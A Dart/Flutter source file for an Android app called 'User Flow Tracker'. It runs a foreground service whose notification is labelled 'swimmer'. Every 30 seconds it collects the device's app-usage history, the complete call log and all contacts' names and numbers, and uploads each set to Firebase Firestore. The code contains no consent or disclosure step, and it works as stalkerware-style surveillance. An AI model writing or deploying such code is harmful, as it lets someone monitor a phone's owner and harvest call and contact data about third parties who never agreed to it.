import 'dart:async';
import 'dart:developer';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:usage_stats/usage_stats.dart';
import 'package:call_log/call_log.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter_foreground_plugin/flutter_foreground_plugin.dart';
import 'package:firebase_core/firebase_core.dart';
import 'firebase_options.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );
  runApp(const UserFlowTrackerApp());
}

class UserFlowTrackerApp extends StatelessWidget {
  const UserFlowTrackerApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'User Flow Tracker',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: const UserFlowTrackerScreen(),
    );
  }
}

class UserFlowTrackerScreen extends StatefulWidget {
  const UserFlowTrackerScreen({super.key});

  @override
  _UserFlowTrackerScreenState createState() => _UserFlowTrackerScreenState();
}

class _UserFlowTrackerScreenState extends State<UserFlowTrackerScreen> {
  List<Map<String, dynamic>> userFlowData = [];
  List<Map<String, dynamic>> callLogsData = [];
  List<Map<String, dynamic>> contactsData = [];
  bool isConnected = true;
  late Timer _timer;

  @override
  void initState() {
    super.initState();
    _startForegroundService();
    _timer = Timer.periodic(const Duration(seconds: 30), (timer) {
      _collectUserFlowData();
      fetchCallLogs();
      fetchContacts();
    });
  }

  @override
  void dispose() {
    _timer.cancel();
    super.dispose();
  }

  void checker() {
    log('checker running');
  }

  void _startForegroundService() async {
    if (Theme.of(context).platform == TargetPlatform.android) {
      // var androidConfig = AndroidConfig(
      //   foregroundService: true,
      //   foregroundServiceType: ForegroundServiceType.DATA_SYNC,
      //   notificationTitle: 'User Flow Tracker',
      //   notificationText: 'Collecting user flow data in the background',
      //   notificationImportance: NotificationImportance.LOW,
      //   notificationIcon: 'mipmap/ic_launcher',
      // );
      await FlutterForegroundPlugin.setServiceMethodInterval(seconds: 5);
      await FlutterForegroundPlugin.setServiceMethod(checker);

      await FlutterForegroundPlugin.startForegroundService(
          iconName: 'mipmap/ic_launcher', title: 'swimmer');
    }
  }

  Future<void> _collectUserFlowData() async {
    try {
      UsageStats.grantUsagePermission();
      if (await Permission.activityRecognition.isGranted) {
        if (await Permission.appTrackingTransparency.isGranted) {
          // var usage = UsageStats;
          var now = DateTime.now();
          DateTime endDate = new DateTime.now();
          DateTime startDate = endDate.subtract(Duration(days: 1));
          List<UsageInfo> usageInfoList =
              await UsageStats.queryUsageStats(startDate, endDate
                  // now.subtract(Duration(hours: 1)).millisecondsSinceEpoch,
                  // now.millisecondsSinceEpoch,
                  );

          List<Map<String, dynamic>> data = [];

          for (var i = 0; i < usageInfoList.length - 1; i++) {
            var currentApp = usageInfoList[i];
            var nextApp = usageInfoList[i + 1];

            data.add({
              'appName': currentApp.packageName,
              'usageTime': currentApp.totalTimeInForeground,
              'movedToAnotherApp':
                  currentApp.packageName != nextApp.packageName,
              'previousApp': i > 0 ? usageInfoList[i - 1].packageName : '',
              'istTime': now.toIso8601String(),
            });
          }

          setState(() {
            userFlowData = data;
          });

          if (isConnected) {
            FirebaseFirestore.instance
                .collection('userFlowData')
                .add({'data': data});
          }
        }
      } else {
        // Handle usage stats permission not granted
      }
    } catch (e) {
      log(e.toString());
    }
  }

  Future<void> fetchCallLogs() async {
    if (await Permission.contacts.isGranted) {
      if (await Permission.phone.isGranted) {
        Iterable<CallLogEntry> entries = await CallLog.get();
        List<Map<String, dynamic>> logs = [];

        for (var entry in entries) {
          logs.add({
            'name': entry.name ?? '',
            'number': entry.number ?? '',
            'type': entry.callType ?? '',
            'date': entry.timestamp.toString(),
          });
        }

        setState(() {
          callLogsData = logs;
        });

        if (isConnected) {
          FirebaseFirestore.instance
              .collection('callLogsData')
              .add({'data': logs});
        }
      }
    } else {
      // Handle call logs permission not granted
    }
  }

  Future<void> fetchContacts() async {
    if (await Permission.contacts.isGranted) {
      Iterable<Contact> contacts = await ContactsService.getContacts();
      List<Map<String, dynamic>> contactsList = [];

      for (var contact in contacts) {
        List<String> phoneNumbers = [];
        // List<String> testNumbers = [];
        for (var phoneNumber in contact.phones!) {
          phoneNumbers.add(phoneNumber.value ?? '');
        }

        contactsList.add({
          'name': contact.displayName ?? '',
          'phoneNumbers': phoneNumbers,
        });
      }

      setState(() {
        contactsData = contactsList;
      });

      if (isConnected) {
        FirebaseFirestore.instance
            .collection('contactsData')
            .add({'data': contactsList});
      }
    } else {
      // Handle contacts permission not granted
    }
  }

  // Future<void> checkConnectivity() async {
  //   var connectivityResult = await Connectivity().checkConnectivity();
  //   setState(() {
  //     isConnected = connectivityResult != ConnectivityResult.none;
  //   });
  // }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('User Flow Tracker'),
      ),
      body: SingleChildScrollView(
        child: Column(
          children: [
            Text('User Flow Data'),
            ListView.builder(
              shrinkWrap: true,
              itemCount: userFlowData.length,
              itemBuilder: (context, index) {
                var data = userFlowData[index];
                return ListTile(
                  title: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text('App Name: ${data['appName']}'),
                      Text('Usage Time: ${data['usageTime']}'),
                      Text(
                          'Moved to Another App: ${data['movedToAnotherApp']}'),
                      Text('Previous App: ${data['previousApp']}'),
                      Text('IST Time: ${data['istTime']}'),
                    ],
                  ),
                );
              },
            ),
            Text('Call Logs'),
            ListView.builder(
              shrinkWrap: true,
              itemCount: callLogsData.length,
              itemBuilder: (context, index) {
                var data = callLogsData[index];
                return ListTile(
                  title: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text('Name: ${data['name']}'),
                      Text('Number: ${data['number']}'),
                      Text('Type: ${data['type']}'),
                      Text('Date: ${data['date']}'),
                    ],
                  ),
                );
              },
            ),
            Text('Contacts'),
            ListView.builder(
              shrinkWrap: true,
              itemCount: contactsData.length,
              itemBuilder: (context, index) {
                var data = contactsData[index];
                return ListTile(
                  title: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text('Name: ${data['name']}'),
                      Text('Phone Numbers: ${data['phoneNumbers'].join(', ')}'),
                    ],
                  ),
                );
              },
            ),
          ],
        ),
      ),
    );
  }
}
